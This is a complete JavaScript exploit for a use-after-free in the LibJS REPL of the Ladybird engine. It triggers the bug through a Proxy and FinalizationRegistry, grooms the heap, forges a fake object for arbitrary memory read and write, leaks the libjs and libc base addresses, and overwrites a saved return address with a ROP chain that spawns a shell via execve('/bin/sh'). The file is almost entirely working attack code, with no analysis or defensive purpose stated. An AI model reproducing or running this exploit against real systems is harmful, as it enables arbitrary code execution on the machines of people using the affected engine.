// Exploit of a UAF in Ladybirds LibJS repl
// (working in b8fa355a21; x86_64-linux)

//
// Utils
//

function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

var Struct = (function() {
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


function Int64(v) {
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.asDouble = function() {
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.bytes = function() {
        return Array.from(bytes);
    };

    this.byteAt = function(i) {
        return bytes[i];
    };

    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    this.toHex = function() {
        return hexlify(Array.from(bytes));
    };

    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, new Int64(1));
    }, 1);

    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

function Int64FromDouble(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

function Neg(n) {
    return (new Int64()).assignNeg(n);
}

function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}


//
// Start of exploit
//

// misc
const OBJ_TAG = 0xfff9000000000000;
const FAKE_OBJ_BUFF_SIZE = 0x1000 - 8;
const SPRAY_SIZE = 0x40000;

// offsets
const RW_PTR_OFFSET = 0x28;
const INDEXED_STORAGE_OFFSET = 0x38;
const MAY_INTERFERE_WITH_INDEXED_PROPERTY_ACCESS_OFFSET = 0x15;
const IS_SIMPLE_STORAGE_OFFSET = 0x8;
const LIBJS_PTR_OFFSET = 0x3714b0;
const LIBC_PTR_OFFSET = 0x175b40;
const INTERNAL_GET_OFFSET = 0x80;
const LIBJS_TO_LIBC_PTR_OFFSET = 0x5d6a50;
const LIBC_ARGV_OFFSET = 0x1f86e0;
const LIBC_START_CALL_MAIN_OFFSET = 0x2a1fe;

function meow() {}

let flag = 0;
let obj = [ 0xdeadcafe ];
let linked = new FinalizationRegistry(meow);
let dummy = {};

let obj_addr;
let fake_obj;
let fake_obj_addr;
let fake_obj_buff;

let keep_alive = new Array(SPRAY_SIZE);
let defrag_token = {};

function defrag() {
    // 0x1000 chunks
    for (let i = 0; i < keep_alive.length / 2; i++) {
        keep_alive[i] = new Uint8Array(FAKE_OBJ_BUFF_SIZE);
    }

    // 0x30 chunks
    for (let i = keep_alive.length / 2; i < keep_alive.length; i++) {
        linked.register(dummy, 0x1337, defrag_token);
    }
}

function read(addr, offset) {
    if (offset !== undefined)
        addr = Add(addr, offset);

    fake_obj_buff.subarray(RW_PTR_OFFSET).setFromHex(addr.toHex());

    return Int64FromDouble(fake_obj[0]);
}

function write(addr, value, offset) {
    if (offset !== undefined)
        addr = Add(addr, offset);

    fake_obj_buff.subarray(RW_PTR_OFFSET).setFromHex(addr.toHex());
    fake_obj[0] = value.asDouble();
}

let handler = {
    get() {
        if (flag == 0) {
            // reallocate and free 0x30 chunk
            meow(0x1,  0x2,  0x3,  0x4,  0x5,  0x6);

            // allocate 0x30 chunk
            linked.register(obj, undefined, undefined, undefined, undefined, undefined)

            defrag();

            linked.register(dummy, undefined)

            fake_obj_buff = new Uint8Array(FAKE_OBJ_BUFF_SIZE);
            fake_obj_buff.fill(0x41)

            keep_alive = []
            linked.unregister(defrag_token);

            gc()
        } else {
            // reallocate and free 0x40 chunk
            meow(
                0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8,
            );

            // allocate 0x40 chunk
            let uaf = new Uint8Array(0x38);
            uaf.set(Add(fake_obj_addr, OBJ_TAG).bytes(), 0);
        }

        return null;
    },
};

function Construct() {
    if (flag == 0) {
        this.obj_addr = Int64FromDouble(arguments[0]);
        this.heap_addr = Int64FromDouble(arguments[3]);
    } else {
        fake_obj = arguments[0];

        fake_obj_buff.subarray(INDEXED_STORAGE_OFFSET).setFromHex(fake_obj_addr.toHex());
        fake_obj_buff.set([0x00], MAY_INTERFERE_WITH_INDEXED_PROPERTY_ACCESS_OFFSET);
        fake_obj_buff.set([0x01], IS_SIMPLE_STORAGE_OFFSET);

        let indexed_storage = read(obj_addr, INDEXED_STORAGE_OFFSET);
        console.log("obj indexed storage @ " + indexed_storage)

        let indexed_storage_vtable = read(indexed_storage);
        console.log("simple storage vtable @ " + indexed_storage_vtable)

        // patch vtable so writes dont crash
        fake_obj_buff.setFromHex(indexed_storage_vtable.toHex());
    }

    flag = 1
}

let ConstructProxy = new Proxy(Construct, handler);

// allocate 0x30 chunk
let leaks = new ConstructProxy(
    0x1,  0x2,  0x3,  0x4,  0x5
);

obj_addr = leaks.obj_addr
fake_obj_addr = Add(leaks.heap_addr, 0x60);

console.log("obj @ " + obj_addr);
console.log("heap @ " + leaks.heap_addr);
console.log("fake_obj @ " + fake_obj_addr);

// allocate 0x40 chunk
new ConstructProxy(
    0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7
);

let obj_vtable_addr = read(obj_addr)
console.log("obj vtable @ " + obj_vtable_addr);

let libjs_ptr = read(obj_vtable_addr)
let libjs_base = Sub(libjs_ptr, LIBJS_PTR_OFFSET)
console.log("libjs base @ " + libjs_base);

let libc_ptr_addr = Add(libjs_base, LIBJS_TO_LIBC_PTR_OFFSET)
let libc_ptr = read(libc_ptr_addr)
let libc_base = Sub(libc_ptr, LIBC_PTR_OFFSET)
console.log("libc base @ " + libc_base);

let __libc_argv = Add(libc_base, LIBC_ARGV_OFFSET)
console.log("__libc_argv @ " + __libc_argv);

let saved_argv = read(__libc_argv)
console.log("saved_argv @ " + saved_argv);

let __libc_start_call_main = Add(libc_base, LIBC_START_CALL_MAIN_OFFSET)
console.log("__libc_start_call_main @ " + __libc_start_call_main);

console.log("searching stack for saved __libc_start_call_main return address...");
const MAX_ITER = 200;
const QWORD_SIZE = 8;
let saved_return = null;

for (let i = 0, current_address = saved_argv;
        i < MAX_ITER; i++, current_address.assignSub(current_address, QWORD_SIZE)) {
    let value = read(current_address);

    if (value.asDouble() == __libc_start_call_main.asDouble()) {
        saved_return = current_address
        break
    }
}

if (!saved_return)
    console.log("failed to find :(");

console.log("found! @ " + saved_return);


function rebase(offset) {
    return Add(libc_base, offset)
}

chain = [
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64("68732f6e69622f2f"), // "//bin/sh"
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7000),
    rebase(0x0000000000041913), // 0x0000000000041913: mov qword ptr [rdi], rax; xor eax, eax; xor edi, edi; ret;
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64(0x0000000000000000), // NULL word
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7008),
    rebase(0x0000000000041913), // 0x0000000000041913: mov qword ptr [rdi], rax; xor eax, eax; xor edi, edi; ret;
    rebase(0x0000000000198071), // 0x0000000000198071: pop rdi; ret;
    rebase(0x00000000001f7000),
    rebase(0x000000000019cfa6), // 0x000000000019cfa6: pop rsi; add eax, 0x26224; ret;
    rebase(0x00000000001f7008),
    rebase(0x0000000000174775), // 0x0000000000174775: pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
    rebase(0x00000000001f7008),
    rebase(0x00000000000d5157), // 0x00000000000d5157: pop rax; ret;
    new Int64(0x000000000000003b),
    rebase(0x00000000000ea3f9), // 0x00000000000ea3f9: syscall; ret;
];

for (let i = 0; i < chain.length; i++) {
    if (i == 6) {
        // nan-boxing dissallows us from writing a NULL word
        // so do a weird half-write instead
        write(saved_return, chain[i], QWORD_SIZE * i);
        write(saved_return, chain[i], QWORD_SIZE * i + 6);
    } else {
        write(saved_return, chain[i], QWORD_SIZE * i);
    }
}

